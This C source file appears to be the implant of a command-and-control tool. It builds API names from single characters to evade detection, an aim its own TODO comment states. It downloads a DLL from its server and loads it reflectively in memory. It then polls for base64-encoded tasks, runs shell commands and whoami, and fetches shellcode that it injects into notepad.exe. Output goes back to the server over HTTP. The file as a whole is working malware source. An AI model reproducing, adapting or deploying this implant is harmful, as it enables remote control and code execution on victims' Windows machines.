// TODO: Using custom implementations of functionalities such as trimming and parsing is not okay as they can easily be flagged
// TODO: is readJsonTask still modifying json?

#include "../include/addresshunter.h"
#include "../include/http.h"
#include "../include/typedefs.h"

// will be overriden by ImhulluCLI
//#define SERVER '1','9','2','.','1','6','8','.','0','.','1',0
//#define PORT 5001
//#define UUID '1','1','e','3','b','2','7','c','-','a','1','e','7','-','4','2','2','4','-','b','4','d','9','-','3','a','f','3','6','f','a','2','f','0','d','0',0

#ifndef SERVER_M
#define SERVER_M '1','9','2','.','1','6','8','.','0','.','1',0
#endif
#ifndef PORT_M
#define PORT_M 5001
#endif
#ifndef UUID_M
#define UUID_M '1','1','e','3','b','2','7','c','-','a','1','e','7','-','4','2','2','4','-','b','4','d','9','-','3','a','f','3','6','f','a','2','f','0','d','0',0
#endif

//HANDLE loaderInjectRD(PAPI api, LPVOID lpDll, DWORD dwDllSize)
HANDLE loaderInjectRD(PAPI api, PDLL pDll)
{
    DWORD loaderOffset;
    REFLECTIVELOADER pReflectiveLoader;
    DLLMAIN pDllMain;

    //loaderOffset = GetRLOffset(api, lpDll);
    loaderOffset = GetRLOffset(api, pDll->Buffer);

    #ifdef DEBUG
    WCHAR loader[] = { 'L', 'o', 'a', 'd', 'e', 'r', ':', ' ', '%', 'p', '\n', 0 };
    //((WPRINTF)api->wprintf)(loader, (UINT_PTR)lpDll + loaderOffset);
    ((WPRINTF)api->wprintf)(loader, (UINT_PTR)pDll->Buffer + loaderOffset);
    #endif

    //((WPRINTF)api->wprintf)(L"Origin DLL location: %p\n", lpDll);
    //pReflectiveLoader = (REFLECTIVELOADER)((UINT_PTR)lpDll + loaderOffset);
    pReflectiveLoader = (REFLECTIVELOADER)((UINT_PTR)pDll->Buffer + loaderOffset);

    DWORD dwOldProtect;
    ((VIRTUALPROTECT)api->VirtualProtect)(pDll->Buffer, pDll->Size, PAGE_EXECUTE_READWRITE, &dwOldProtect);

    HANDLE hDllBase = NULL;

    pDllMain = (DLLMAIN)pReflectiveLoader();

    #ifdef DEBUG
    CHAR text[] = { 'D', 'l', 'l', 'M', 'a', 'i', 'n', 0 };
    ((MESSAGEBOXA)api->MessageBoxA)(0, text, text, 0x0L);
    #endif

    if( pDllMain != NULL )
    {
        // call the loaded librarys DllMain to get its HMODULE
        if ( pDllMain(NULL, DLL_QUERY_HMODULE, &hDllBase) == FALSE)
        {
            #ifdef DEBUG
            CHAR text[] = { 'D', 'l', 'l', 'M', 'a', 'i', 'n', 'F', 'a', 'i', 'l', '1', 0 };
            ((MESSAGEBOXA)api->MessageBoxA)(0, text, text, 0x0L);
            #endif
            hDllBase = NULL;
        }
    }
    else
    {
        #ifdef DEBUG
        CHAR text[] = { 'D', 'l', 'l', 'M', 'a', 'i', 'n', 'F', 'a', 'i', 'l', '2', 0 };
        ((MESSAGEBOXA)api->MessageBoxA)(0, text, text, 0x0L);
        #endif
    }

    return hDllBase;
}

CHAR* myStrtok(CHAR* str, CHAR delim, BOOL reset)
{
    static DWORD index = 0;
    if (reset)
    { index=0; return NULL; }
    //CHAR* token = { 0 };
    DWORD lenStr = myStrlenA(str);
    str += index;

    for (int i=0; i<lenStr+1; i++)
    {
        if (str[i] == delim)
        { str[i] = '\0'; }
    }

    //token = str;
    index += myStrlenA(str)+1;    // +1 for null byte
    return str;
}

CHAR* myStartTrim(CHAR* str, CHAR trim)
{
    CHAR* outStr = str;
    while (outStr[0] == trim)
    { outStr++; }
    return outStr;
}

CHAR* myEndTrim(CHAR* str, CHAR trim)
{
    for (int i=myStrlenA(str)-1; i>=0; i--)     // -1 for null terminator
    {
        if(str[i] == trim)
        { str[i] = '\0'; }          // change trim with a null terminator
        else
        { return str; }
    }
    return str;
}

CHAR* myTrim(CCHAR* str, CHAR trim)
{
    CHAR* outStr = myStartTrim(str, trim);
    outStr = myEndTrim(outStr, trim);
    return outStr;
}

CHAR* readJsonTask(PAPI api, CHAR* json, CHAR** taskId, CHAR** taskType, CHAR** uuid)
{
    CHAR* tmpJson = json;  // myStrtok modifies the string itself
    CHAR* task;
    CHAR delim = { '\n' };
    CHAR* token = myStrtok(tmpJson, delim, FALSE);
    CHAR blacklist[] = { '[', ']', '\0' };

    if (token[0] == '[' && token[1] == ']')
    {
        myStrtok(NULL, 0, TRUE);
        return NULL;
    }

    // SKIP [ and ]
    for (int i=0; i<=myStrlenA(blacklist)-1; i++)
    {
        for (int j=0; j<=myStrlenA(token)-1; j++)
        {
            if (token[j] == blacklist[i])
            {
                token = myStrtok(tmpJson, delim, FALSE);
                i=-1;
                break;
            }
        }
    }

    // dont look
    *taskId = myTrim(token, ' ');
    *taskId = myEndTrim(*taskId, ',');
    task = myTrim(myStrtok(tmpJson, delim, FALSE), ' ');
    task = myEndTrim(task, ',');
    task = myTrim(task, '"');
    *taskType = myTrim(myStrtok(tmpJson, delim, FALSE), ' ');
    *taskType= myEndTrim(*taskType, ',');
    *taskType = myTrim(*taskType, '"');
    *uuid = myTrim(myStrtok(tmpJson, delim, FALSE), ' ');
    *uuid = myEndTrim(*uuid, ',');
    *uuid = myTrim(*uuid, '"');

    myStrtok(NULL, 0, TRUE);
    return task;
}

void myMain()
{
    API Api = { 0 };
    PAPI api = &Api;

    // Library Names
    CHAR user32_c[] = { 'u', 's', 'e', 'r', '3', '2', '.', 'd', 'l', 'l', 0 };
    CHAR winhttp_c[] = { 'w', 'i', 'n', 'h', 't', 't', 'p', 0 };
    CHAR msvcrt_c[] = { 'm', 's', 'v', 'c', 'r', 't', 0 };
    CHAR crypt32_c[] = { 'c', 'r', 'y', 'p', 't', '3', '2', '.', 'd', 'l', 'l', 0 };
    CHAR shlwapi_c[] = { 's', 'h', 'l', 'w', 'a', 'p', 'i', '.', 'd', 'l', 'l', 0 };

    // Library Declarations
    UINT64 kernel32dll, winhttpdll, msvcrtdll, user32dll, crypt32dll, shlwapidll;
 
    // Function Names
    CHAR messageBoxA_c[] = { 'M', 'e', 's', 's', 'a', 'g', 'e', 'B', 'o', 'x', 'A', 0 };
    CHAR messageBoxW_c[] = { 'M', 'e', 's', 's', 'a', 'g', 'e', 'B', 'o', 'x', 'W', 0 };
    CHAR loadlibrarya_c[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0 };
    CHAR winHttpOpen_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'O', 'p', 'e', 'n', 0 };
    CHAR winHttpConnect_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'C', 'o', 'n', 'n', 'e', 'c', 't', 0 };
    CHAR winHttpOpenRequest_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'O', 'p', 'e', 'n', 'R', 'e', 'q', 'u', 'e', 's', 't', 0 };
    CHAR winHttpSendRequest_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'S', 'e', 'n', 'd', 'R', 'e', 'q', 'u', 'e', 's', 't', 0 };
    CHAR winHttpReceiveResponse_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'R', 'e', 'c', 'e', 'i', 'v', 'e', 'R', 'e', 's', 'p', 'o', 'n', 's', 'e', 0 };
    CHAR WinHttpQueryDataAvailable_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'Q', 'u', 'e', 'r', 'y', 'D', 'a', 't', 'a', 'A', 'v', 'a', 'i', 'l', 'a', 'b', 'l', 'e', 0 };
    CHAR winHttpQueryHeaders_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'Q', 'u', 'e', 'r', 'y', 'H', 'e', 'a', 'd', 'e', 'r', 's', 0 };
    CHAR winHttpReadData_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'R', 'e', 'a', 'd', 'D', 'a', 't', 'a', 0 };
    CHAR winHttpCloseHandle_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0 };
    CHAR getLastError_c[] = {'G', 'e', 't', 'L', 'a', 's', 't', 'E', 'r', 'r', 'o', 'r', 0 };
    #ifdef DEBUG
    CHAR wprintf_c[] = { 'w', 'p', 'r', 'i', 'n', 't', 'f', 0 };
    CHAR printf_c[] = { 'p', 'r', 'i', 'n', 't', 'f', 0 };
    #endif
    CHAR snprintf_c[] = { '_', 's', 'n', 'p', 'r', 'i', 'n', 't', 'f', 0 };
    CHAR malloc_c[] = { 'm', 'a', 'l', 'l', 'o', 'c', 0 };
    CHAR calloc_c[] = { 'c', 'a', 'l', 'l', 'o', 'c', 0 };
    CHAR free_c[] = { 'f', 'r', 'e', 'e', 0 };
    CHAR virtualProtect_c[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0 };
    CHAR virtualAlloc_c[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0 };
    CHAR createThread_c[] = { 'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 0 };
    CHAR waitForSingleObject_c[] = { 'W', 'a', 'i', 't', 'F', 'o', 'r', 'S', 'i', 'n', 'g', 'l', 'e', 'O', 'b', 'j', 'e', 'c', 't', 0 };
    CHAR CryptStringToBinaryA_c[] = { 'C', 'r', 'y', 'p', 't', 'S', 't', 'r', 'i', 'n', 'g', 'T', 'o', 'B', 'i', 'n', 'a', 'r', 'y', 'A', 0 };
    CHAR CryptBinaryToStringA_c[] = { 'C', 'r', 'y', 'p', 't', 'B', 'i', 'n', 'a', 'r', 'y', 'T', 'o', 'S', 't', 'r', 'i', 'n', 'g', 'A', 0 };
    CHAR StrToIntW_c[] = { 'S', 't', 'r', 'T', 'o', 'I', 'n', 't', 'W', 0 };
    CHAR closeHandle_c[] = { 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0 };
    CHAR sleep_c[] = { 'S', 'l', 'e', 'e', 'p', 0 };
    CHAR exitThread_c[] = { 'E', 'x', 'i', 't', 'T', 'h', 'r', 'e', 'a', 'd', 0 };

    // Get Kernel32
    kernel32dll = GetKernel32();
    // GetLoadLibraryA
    api->LoadLibraryA = GetSymbolAddress((HANDLE)kernel32dll, loadlibrarya_c);

    // Getting Libraries
    user32dll = (UINT64)((LOADLIBRARYA)api->LoadLibraryA)(user32_c);
    msvcrtdll = (UINT64)((LOADLIBRARYA)api->LoadLibraryA)(msvcrt_c);
    winhttpdll = (UINT64)((LOADLIBRARYA)api->LoadLibraryA)(winhttp_c);
    crypt32dll = (UINT64)((LOADLIBRARYA)api->LoadLibraryA)(crypt32_c);
    shlwapidll = (UINT64)((LOADLIBRARYA)api->LoadLibraryA)(shlwapi_c);

    // WinHTTP
    api->WinHttpConnect = GetSymbolAddress((HANDLE)winhttpdll, winHttpConnect_c);
    api->WinHttpOpen = GetSymbolAddress((HANDLE)winhttpdll, winHttpOpen_c);
    api->WinHttpOpenRequest = GetSymbolAddress((HANDLE)winhttpdll, winHttpOpenRequest_c);
    api->WinHttpSendRequest = GetSymbolAddress((HANDLE)winhttpdll, winHttpSendRequest_c);
    api->WinHttpReceiveResponse = GetSymbolAddress((HANDLE)winhttpdll, winHttpReceiveResponse_c);
    api->WinHttpQueryDataAvailable = GetSymbolAddress((HANDLE) winhttpdll, WinHttpQueryDataAvailable_c);
    api->WinHttpQueryHeaders = GetSymbolAddress((HANDLE)winhttpdll, winHttpQueryHeaders_c);
    api->WinHttpReadData = GetSymbolAddress((HANDLE)winhttpdll, winHttpReadData_c);
    api->WinHttpCloseHandle = GetSymbolAddress((HANDLE)winhttpdll, winHttpCloseHandle_c);

    // Getting functions
    // User32
    // Msvcrt
    // kernel32
    api->malloc = GetSymbolAddress((HANDLE)msvcrtdll, malloc_c);
    api->calloc = GetSymbolAddress((HANDLE)msvcrtdll, calloc_c);
    api->free = GetSymbolAddress((HANDLE)msvcrtdll, free_c);
    api->GetLastError = GetSymbolAddress((HANDLE)kernel32dll, getLastError_c);
    api->MessageBoxA = GetSymbolAddress((HANDLE)user32dll, messageBoxA_c);
    api->MessageBoxW = GetSymbolAddress((HANDLE)user32dll, messageBoxW_c);
    #ifdef DEBUG
    api->wprintf = GetSymbolAddress((HANDLE)msvcrtdll, wprintf_c);
    api->printf = GetSymbolAddress((HANDLE)msvcrtdll, printf_c);
    #endif
    api->snprintf = GetSymbolAddress((HANDLE)msvcrtdll, snprintf_c);
    api->VirtualProtect = GetSymbolAddress((HANDLE)kernel32dll, virtualProtect_c);
    api->VirtualAlloc = GetSymbolAddress((HANDLE)kernel32dll, virtualAlloc_c);
    api->CreateThread = GetSymbolAddress((HANDLE)kernel32dll, createThread_c);
    api->WaitForSingleObject = GetSymbolAddress((HANDLE)kernel32dll, waitForSingleObject_c);
    api->CloseHandle = GetSymbolAddress((HANDLE)kernel32dll, closeHandle_c);
    api->Sleep = GetSymbolAddress((HANDLE)kernel32dll, sleep_c);
    api->ExitThread = GetSymbolAddress((HANDLE)kernel32dll, exitThread_c);

    // crypt32
    api->CryptStringToBinaryA = GetSymbolAddress((HANDLE)crypt32dll, CryptStringToBinaryA_c);
    api->CryptBinaryToStringA = GetSymbolAddress((HANDLE)crypt32dll, CryptBinaryToStringA_c);

    // shlwapi
    api->StrToIntW = GetSymbolAddress((HANDLE)shlwapidll, StrToIntW_c);

    DLL esgStdDll;
    PDLL pEsgStdDll = &esgStdDll;
    pEsgStdDll->Buffer = NULL;

    WCHAR wServer[] = { SERVER_M } ;
    WCHAR tasksPath[] = { '/', 't', 'a', 's', 'k', 's', '/', 0 };
    WCHAR uuid[] = { UUID_M } ;
    INTERNET_PORT port = PORT_M;

    #ifdef DEBUG
    CHAR msg[] = { 'd', 'l', 'l', 'N', 'o', 't', 'F', 'o', 'u', 'n', 'd', 0 };
    #endif
    WCHAR wcStageEndpoint[] = { '/', 's', 't', 'a', 'g', 'e', '/', 0 };
    while (pEsgStdDll->Buffer == NULL)
    {
        pEsgStdDll->Buffer = httpGetExecutable(api, &pEsgStdDll->Size, wcStageEndpoint, wServer, port);
        ((SLEEP)api->Sleep)(5000);
        if (pEsgStdDll->Buffer != NULL)
        { break; }
        #ifdef DEBUG
        ((MESSAGEBOXA)api->MessageBoxA)(0, msg, msg, 0X0L);
        #endif
    }

    ESG_STD_API EsgStdApi = { 0 };
    PESG_STD_API PEsgStdApi = &EsgStdApi;

    //pEsgStdDll->Buffer = loaderInjectRD(api, pEsgStdDll->Buffer, pEsgStdDll->Size);
    pEsgStdDll->Buffer = loaderInjectRD(api, pEsgStdDll);

    CHAR runCmd_c[] = { 'R', 'u', 'n', 'C', 'm', 'd', 0 };
    CHAR whoami_c[] = { 'W', 'h', 'o', 'a', 'm', 'i', 0 };
    CHAR injectIntoProcess_c[] = { 'i', 'n', 'j', 'e', 'c', 't', 'I', 'n', 't', 'o', 'P', 'r', 'o', 'c', 'e', 's', 's', 0 };

    PEsgStdApi->RunCmd = GetSymbolAddress((HANDLE)pEsgStdDll->Buffer, runCmd_c);
    PEsgStdApi->Whoami = GetSymbolAddress((HANDLE)pEsgStdDll->Buffer, whoami_c);
    PEsgStdApi->injectIntoProcess = GetSymbolAddress((HANDLE)pEsgStdDll->Buffer, injectIntoProcess_c);

    //WCHAR* fullPath = myConcatW(api, tasksPath, uuid);
    WCHAR fullPath[] = { '/', 't', 'a', 's', 'k', 's', '/', UUID_M };

    CHAR* jsonResponse = NULL;
    CHAR* taskId = { 0 };
    CHAR* taskType = { 0 };
    CHAR* agentUuid = { 0 };
    CHAR* b64Task;
    CHAR* task = NULL;
    CHAR* orgOutput = NULL;
    DWORD taskSize;
    CHAR* taskOutput;
    CHAR* b64EncodedOutput;
    DWORD b64EncodedOutputSize;
    DWORD sizeOfOutput;
    CHAR jsonFormat[] =
    {
    '{', '"', 't', 'a', 's', 'k', '_', 'i', 'd', '"', ':', ' ', '"', '%', 's', '"', ',',
    ' ', '"', 'a', 'g', 'e', 'n', 't', '_', 'u', 'u', 'i', 'd', '"', ':', ' ', '"',
    '%', 's', '"', ',', ' ', '"', 't', 'a', 's', 'k', '_', 'o', 'u', 't', 'p',
    'u', 't', '"', ':', ' ', '"', '%', 's', '"', '}'
    };
    DWORD totalJsonSize;
    CHAR* json;
    WCHAR fullPath2[] =
    {
        '/', 's', 'e', 'n', 'd', '_', 't', 'a', 's', 'k', '_', 'o', 'u', 't', 'p', 'u',
        't', '/', UUID_M
    };

    while (TRUE)
    {
        jsonResponse = GetRequest(api, wServer, port, fullPath);

        if (!jsonResponse)
        {
            ((SLEEP)api->Sleep)(3000);
            continue;
        }

        b64Task = readJsonTask(api, jsonResponse, &taskId, &taskType, &agentUuid);

        if (b64Task == NULL)
        {
            ((SLEEP)api->Sleep)(3000);
            continue;
        }

        ((CRYPTSTRINGTOBINARYA)api->CryptStringToBinaryA)
        (
                (LPCSTR)b64Task,
                myStrlenA(b64Task),
                CRYPT_STRING_BASE64,
                NULL,
                &taskSize,
                NULL,
                NULL
        );
        task = (CHAR*)((CALLOC)api->calloc)(taskSize+1, sizeof(CHAR));

        ((CRYPTSTRINGTOBINARYA)api->CryptStringToBinaryA)
        (
                (LPCSTR)b64Task,
                myStrlenA(b64Task),
                CRYPT_STRING_BASE64,
                (PBYTE)task,
                &taskSize,
                NULL,
                NULL
        );

        CHAR cmd[] = { 'c', 'm', 'd', 0 };
        CHAR whoami[] = { 'w', 'h', 'o', 'a', 'm', 'i', 0 };
        CHAR shutdown[] = { 's', 'h', 'u', 't', 'd', 'o', 'w', 'n', 0 };
        CHAR executeAssembly[] = { 'e', 'x', 'e', 'c', 'u', 't', 'e', '_', 'a', 's', 's', 'e', 'm', 'b', 'l', 'y', 0 };
        if (my_strcmp(taskType, cmd) == 0)
        {
            orgOutput = ((RUNCMD)PEsgStdApi->RunCmd)(task, &sizeOfOutput);
            taskOutput = myTrim(orgOutput, '\n');
        }
        else if (my_strcmp(taskType, whoami) == 0)
        {
            orgOutput = ((WHOAMI)PEsgStdApi->Whoami)();
            taskOutput = myTrim(orgOutput, '\n');
        }
        else if (my_strcmp(taskType, shutdown) == 0)
        {
            const DWORD dwEncodedExitOutputSize = 17;
            CHAR encodedExitOutput[17] = { 'R', 'X', 'h', 'p', 'd', 'F', 'N', '1', 'Y', '2', 'N', 'l', 'c', '3', 'M', '=', 0 };
            totalJsonSize = myStrlenA(jsonFormat)-6 + dwEncodedExitOutputSize-1 + myStrlenA(taskId) + myStrlenA(agentUuid) + 16;
            json = (CHAR*)((CALLOC)api->calloc)(totalJsonSize, sizeof(CHAR));
            ((SNPRINTF)api->snprintf)(json, totalJsonSize, jsonFormat, taskId, agentUuid, encodedExitOutput);
            PostRequest(api, wServer, port, fullPath2, json);

            if (pEsgStdDll->Buffer)
            {
                ((FREE)api->free)(pEsgStdDll->Buffer);
            }
            if (json)
            {
                ((FREE)api->free)(json);
            }
            if (task)
            {
                ((FREE)api->free)(task);
            }

            ((EXITTHREAD)api->ExitThread)(0);
        }
        else if (my_strcmp(taskType, executeAssembly) == 0)
        {
            CHAR lpApplicationName[] = { 'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'n', 'o', 't', 'e', 'p', 'a', 'd', '.', 'e', 'x', 'e', 0 };
            DWORD dwShellcodeSize;
            WCHAR cAssemblyEndpoint[] = { '/', 'e', 'x', 'e', 'c', 'u', 't', 'e', '_', 'a', 's', 's', 'e', 'm', 'b', 'l', 'y', '/', 0 };
            LPVOID shellcode = httpGetExecutable(api, &dwShellcodeSize, cAssemblyEndpoint, wServer, port);
            CHAR hi[] = {'S', 'i', 'z', 'e', ':', ' ', '%', 'd', 0};
            ((INJECTINTOPROCESS)PEsgStdApi->injectIntoProcess)(shellcode, dwShellcodeSize, (LPCSTR)lpApplicationName);
            CHAR buf[] = { 'E', 'x', 'e', 'c', 'u', 't', 'e', 'A', 's', 's', 'e', 'm', 'b', 'l', 'y', 0 };
            taskOutput = (CHAR*)buf;
        }
        else
        {
            ((SLEEP)api->Sleep)(3000);
            continue;
        }

        ((CRYPTBINARYTOSTRINGA)api->CryptBinaryToStringA)((BYTE*)taskOutput, myStrlenA(taskOutput)+1, CRYPT_STRING_BASE64+CRYPT_STRING_NOCRLF, NULL, &b64EncodedOutputSize);
        b64EncodedOutput = (CHAR*)((CALLOC)api->calloc)(b64EncodedOutputSize, sizeof(CHAR));
        ((CRYPTBINARYTOSTRINGA)api->CryptBinaryToStringA)((BYTE*)taskOutput, myStrlenA(taskOutput)+1, CRYPT_STRING_BASE64+CRYPT_STRING_NOCRLF, b64EncodedOutput, &b64EncodedOutputSize);

        totalJsonSize = myStrlenA(jsonFormat)-6 + b64EncodedOutputSize + myStrlenA(taskId) + myStrlenA(agentUuid) + 16;
        json = (CHAR*)((CALLOC)api->calloc)(totalJsonSize, sizeof(CHAR));
        ((SNPRINTF)api->snprintf)(json, totalJsonSize, jsonFormat, taskId, agentUuid, b64EncodedOutput);
        PostRequest(api, wServer, port, fullPath2, json);

        if (orgOutput)
        {
            ((FREE)api->free)(orgOutput);
        }
        if (b64EncodedOutput)
        {
            ((FREE)api->free)(b64EncodedOutput);
        }
        if (jsonResponse)
        {
            ((FREE)api->free)(jsonResponse);
        }
        if (json)
        {
            ((FREE)api->free)(json);
        }
        if (task)
        {
            ((FREE)api->free)(task);
        }

        ((SLEEP)api->Sleep)(3000);
    }
    if (pEsgStdDll->Buffer)
    {
        ((FREE)api->free)(pEsgStdDll->Buffer);
    }
}

